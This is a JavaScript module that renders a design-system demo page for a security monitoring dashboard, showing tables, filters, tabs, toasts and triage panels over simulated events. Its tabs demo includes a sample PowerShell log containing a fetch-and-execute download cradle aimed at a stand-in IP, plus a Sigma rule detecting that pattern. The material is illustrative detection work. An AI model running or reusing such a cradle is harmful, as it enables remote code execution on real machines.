/**
 * UI component kit / living style guide (#/components).
 *
 * Every component used by Modules 01–10 is shown here working against the
 * SIMULATED sample-events dataset, so reviewers can exercise filters, sorting,
 * the detail drawer, tabs, toasts and exports in one place.
 */
import { el, formatUtcDateTime, severityBadge, provenanceBadge } from '../utils/dom.js';
import { load, SEVERITY_RANK } from '../data-service.js';
import { createDataTable } from '../components/data-table.js';
import { createFilterBar, applyFilters, isEmptyState } from '../components/filter-bar.js';
import { createTabs } from '../components/tabs.js';
import { openEventDrawer } from '../components/event-drawer.js';
import { toast } from '../components/toast.js';
import { exportCSV, exportJSON, stamp } from '../components/export.js';
import { createCodeBlock } from '../components/code-block.js';

const SEVERITIES = ['critical', 'high', 'medium', 'low', 'info'];
const STATUSES = ['open', 'investigating', 'contained', 'closed'];
const title = (s) => s.charAt(0).toUpperCase() + s.slice(1).replace(/-/g, ' ');

const EXPORT_COLUMNS = [
  { key: 'id', label: 'Event ID' }, { key: 'ts', label: 'Timestamp (UTC)' }, { key: 'severity', label: 'Severity' },
  { key: 'status', label: 'Status' }, { key: 'category', label: 'Category' }, { key: 'source', label: 'Log source' },
  { key: 'host', label: 'Host' }, { key: 'user', label: 'User' }, { key: 'mitre', label: 'ATT&CK' }, { key: 'message', label: 'Message' }
];

/* Illustrative example content for the tabs demo (clearly labelled in the UI). */
const RAW_4104 = `Log Name:      Microsoft-Windows-PowerShell/Operational
Source:        Microsoft-Windows-PowerShell
Event ID:      4104
Level:         Warning
Computer:      WS-HR-022.corp.example
User:          CORP\\m.ito
Date (UTC):    2026-11-21T22:36:52Z
Message:       Creating Scriptblock text (1 of 1):
               IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.88/a.ps1')
               ScriptBlock ID: 6f1c2a0e-3b7d-4c55-9a7e-0d2f8b1e4c10`;

const SIGMA_EXAMPLE = `title: PowerShell Download Cradle in Script Block
id: 3f5a6c2e-8d41-4b7a-9e1f-2c6d8a0b7e55
status: experimental   # illustrative — validated with pySigma in Phase 6
description: Detects common in-memory download-and-execute patterns logged by Script Block Logging.
author: Sentinel X (demo)
date: 2026-11-22
tags:
  - attack.execution
  - attack.t1059.001
logsource:
  product: windows
  category: ps_script
detection:
  selection_download:
    ScriptBlockText|contains:
      - 'Net.WebClient'
      - 'DownloadString'
      - 'DownloadFile'
      - 'Invoke-WebRequest'
  selection_exec:
    ScriptBlockText|contains:
      - 'IEX'
      - 'Invoke-Expression'
  condition: selection_download and selection_exec
falsepositives:
  - Administrative or software-deployment scripts that bootstrap from internal repositories
level: high`;

export async function renderComponents(view) {
  const { data } = await load('events');
  const events = data.events;

  /* ---------- Event explorer: filter bar + table + drawer + export ---------- */
  const count = el('span', { class: 'kpi-sub', role: 'status', 'aria-live': 'polite' });
  let filtered = events;

  const table = createDataTable({
    caption: 'Simulated security events',
    pageSize: 8,
    initialSort: { key: 'ts', dir: 'desc' },
    rows: events,
    rowLabel: (r) => r.id,
    onRowActivate: (row, trigger) => openEventDrawer(row, trigger),
    columns: [
      { key: 'ts', label: 'Time (UTC)', sortable: true, defaultDir: 'desc', className: 'mono', render: (r) => el('time', { datetime: r.ts }, formatUtcDateTime(r.ts).replace(' UTC', '')) },
      { key: 'severity', label: 'Severity', sortable: true, defaultDir: 'desc', sortValue: (r) => SEVERITY_RANK[r.severity], render: (r) => severityBadge(r.severity) },
      { key: 'id', label: 'ID', sortable: true, className: 'mono' },
      { key: 'host', label: 'Host', sortable: true, className: 'mono' },
      { key: 'source', label: 'Source', sortable: true },
      { key: 'status', label: 'Status', sortable: true, render: (r) => title(r.status) },
      { key: 'message', label: 'Message', className: 'col-msg' }
    ]
  });

  const updateCount = () => { count.textContent = `${filtered.length} of ${events.length} events match`; };
  updateCount();

  const categories = [...new Set(events.map((e) => e.category))].sort();
  const filterBar = createFilterBar({
    ariaLabel: 'Filter events',
    searchLabel: 'Search events',
    searchPlaceholder: 'Host, user, ATT&CK ID, message…',
    chips: [{ key: 'severity', label: 'Severity', options: SEVERITIES.map((s) => ({ value: s, label: s, className: `sev-${s}` })) }],
    selects: [
      { key: 'status', label: 'Status', options: STATUSES.map((s) => ({ value: s, label: title(s) })) },
      { key: 'category', label: 'Event type', options: categories.map((c) => ({ value: c, label: title(c) })) }
    ],
    dateRange: { label: 'Date (UTC)' },
    onChange(state) {
      filtered = applyFilters(events, state, { searchFields: ['id', 'host', 'user', 'source', 'mitre', 'message', 'category'], dateField: 'ts' });
      table.setRows(filtered);
      updateCount();
      lastState = state;
    }
  });
  let lastState = filterBar.getState();

  const csvBtn = el('button', { class: 'btn btn-sm', type: 'button' }, 'Export CSV');
  const jsonBtn = el('button', { class: 'btn btn-sm', type: 'button' }, 'Export JSON');
  csvBtn.addEventListener('click', () => {
    const rows = table.getSortedRows();
    if (!rows.length) return toast('Nothing to export — no events match the filters.', { variant: 'warning' });
    exportCSV(`sentinel-x-events-${stamp()}.csv`, rows, EXPORT_COLUMNS);
    toast(`Exported ${rows.length} events to CSV`, { variant: 'success' });
  });
  jsonBtn.addEventListener('click', () => {
    const rows = table.getSortedRows();
    if (!rows.length) return toast('Nothing to export — no events match the filters.', { variant: 'warning' });
    exportJSON(`sentinel-x-events-${stamp()}.json`, {
      exportedAt: new Date().toISOString(),
      provenance: 'simulated',
      filters: isEmptyState(lastState) ? null : lastState,
      count: rows.length,
      events: rows
    });
    toast(`Exported ${rows.length} events to JSON`, { variant: 'success' });
  });

  const explorer = el('section', { class: 'card', 'aria-labelledby': 'explorer-h' },
    el('div', { class: 'section-head' },
      el('h2', { id: 'explorer-h' }, 'Event explorer'),
      provenanceBadge('simulated'),
      count,
      el('div', { class: 'btn-row' }, csvBtn, jsonBtn)
    ),
    el('p', { class: 'kpi-sub' }, 'Filter bar, sortable paginated table, detail drawer and export, working together. Select a row (or its › button) to open the detail drawer.'),
    filterBar.element,
    table.element
  );

  /* ---------- Tabs demo ---------- */
  const tabs = createTabs({
    label: 'Event representations',
    tabs: [
      { id: 'raw', label: 'Raw log', render: () => createCodeBlock({ code: RAW_4104, language: 'log', title: 'Windows PowerShell 4104 (example)' }) },
      { id: 'norm', label: 'Normalised', render: () => el('dl', { class: 'dl' },
        ...[['event.code', '4104'], ['event.provider', 'Microsoft-Windows-PowerShell'], ['host.name', 'WS-HR-022'], ['user.name', 'm.ito'],
          ['powershell.file.script_block_text', "IEX (New-Object Net.WebClient).DownloadString('hxxp://198.51.100[.]88/a.ps1')"],
          ['threat.technique.id', 'T1059.001'], ['@timestamp', '2026-11-21T22:36:52Z']]
          .flatMap(([k, v]) => [el('dt', { class: 'mono' }, k), el('dd', { class: 'mono' }, v)])) },
      { id: 'sigma', label: 'Sigma rule', render: () => el('div', { class: 'stack' },
        el('p', { class: 'kpi-sub' }, 'Illustrative rule, not yet validated with pySigma or tested against lab telemetry. The Detection Engineering module (Phase 6) adds validated rules.'),
        createCodeBlock({ code: SIGMA_EXAMPLE, language: 'yaml', title: 'powershell_download_cradle.yml' })) }
    ]
  });

  const tabsCard = el('section', { class: 'card', 'aria-labelledby': 'tabs-h' },
    el('div', { class: 'section-head' }, el('h2', { id: 'tabs-h' }, 'Tabs & code viewer'), provenanceBadge('simulated')),
    el('p', { class: 'kpi-sub' }, 'One event viewed three ways: raw log, normalised (ECS-style field names), and a detection rule. Use the arrow keys to move between tabs.'),
    tabs.element
  );

  /* ---------- Toasts + badges + tokens ---------- */
  const toastBtns = [
    ['info', 'Info', 'Data refreshed from local snapshot.'],
    ['success', 'Success', 'Report exported successfully.'],
    ['warning', 'Warning', 'Upstream feed rate-limited — showing cached data.'],
    ['error', 'Error', 'Failed to load dataset. Retry or check the console.']
  ].map(([variant, label, msg]) => {
    const b = el('button', { class: 'btn btn-sm', type: 'button' }, `${label} toast`);
    b.addEventListener('click', () => toast(msg, { variant }));
    return b;
  });

  const tokensCard = el('section', { class: 'card', 'aria-labelledby': 'tokens-h' },
    el('h2', { id: 'tokens-h' }, 'Tokens, badges & notifications'),
    el('h3', null, 'Severity scale'),
    el('div', { class: 'swatches' }, SEVERITIES.map((s) => el('span', { class: `swatch sev-${s}` }, el('span', null, s)))),
    el('h3', null, 'Badges'),
    el('div', { class: 'btn-row' }, SEVERITIES.map(severityBadge), ['simulated', 'documented', 'lab'].map(provenanceBadge)),
    el('h3', null, 'Buttons'),
    el('div', { class: 'btn-row' },
      el('a', { class: 'btn btn-primary', href: '#/' }, 'Primary (link)'),
      el('a', { class: 'btn', href: '#/about' }, 'Secondary (link)'),
      el('button', { class: 'btn', type: 'button', disabled: true }, 'Disabled')
    ),
    el('h3', null, 'Toasts'),
    el('div', { class: 'btn-row' }, toastBtns)
  );

  /* ---------- Expandable panels ---------- */
  const panels = el('section', { class: 'card', 'aria-labelledby': 'panels-h' },
    el('h2', { id: 'panels-h' }, 'Expandable investigation panels'),
    el('p', { class: 'kpi-sub' }, 'Native <details> elements: keyboard and screen-reader accessible without extra script.'),
    panel('1. Scope the alert', 'high', ['Confirm the host, user and time window.', 'Check whether the source IP is internal, known, or first-seen.', 'Pull related events ±30 minutes on the same host.'], true),
    panel('2. Collect evidence', 'medium', ['Export relevant logs (Security, Sysmon, PowerShell Operational).', 'Record hashes of any files involved.', 'Preserve volatile data before containment where policy allows.']),
    panel('3. Decide & contain', 'critical', ['Escalate per severity matrix.', 'Isolate the endpoint or disable the account if compromise is likely.', 'Document every action with a UTC timestamp.'])
  );

  /* ---------- Keyboard reference ---------- */
  const keys = el('section', { class: 'card', 'aria-labelledby': 'keys-h' },
    el('h2', { id: 'keys-h' }, 'Keyboard support'),
    el('table', { class: 'kbd-table' }, el('caption', { class: 'visually-hidden' }, 'Keyboard support by component'),
      el('thead', null, el('tr', null, el('th', { scope: 'col' }, 'Component'), el('th', { scope: 'col' }, 'Keys'))),
      el('tbody', null, ...[
        ['Everywhere', [['Tab'], ' / ', ['Shift', 'Tab'], ' move focus']],
        ['Table', [['Enter'], ' on a column header sorts; ', ['Enter'], ' on › opens details']],
        ['Tabs', [['←'], ' ', ['→'], ' switch tab, ', ['Home'], ' / ', ['End'], ' first / last']],
        ['Drawer', [['Esc'], ' closes; focus returns to the row that opened it']],
        ['Mobile menu', [['Esc'], ' closes the navigation drawer']]
      ].map(([c, parts]) => el('tr', null, el('td', null, c), el('td', null, parts.map((p) => (Array.isArray(p) ? p.map((k) => el('kbd', null, k)) : p))))))
    )
  );

  view.classList.add('stack');
  view.append(
    el('header', { class: 'page-head' },
      el('span', { class: 'eyebrow' }, 'Design system'),
      el('h1', null, 'UI component kit'),
      el('p', { class: 'lede' }, 'The reusable, keyboard-operable components that every Sentinel X module is built from, shown working against the simulated event dataset.')
    ),
    explorer,
    tabsCard,
    el('div', { class: 'grid grid-2' }, tokensCard, panels),
    keys
  );
  return () => view.classList.remove('stack');
}

function panel(summary, sev, steps, open = false) {
  return el('details', { class: 'panel', open: open || null },
    el('summary', null, summary, severityBadge(sev)),
    el('div', { class: 'panel-body' }, el('ol', null, steps.map((s) => el('li', null, s))))
  );
}
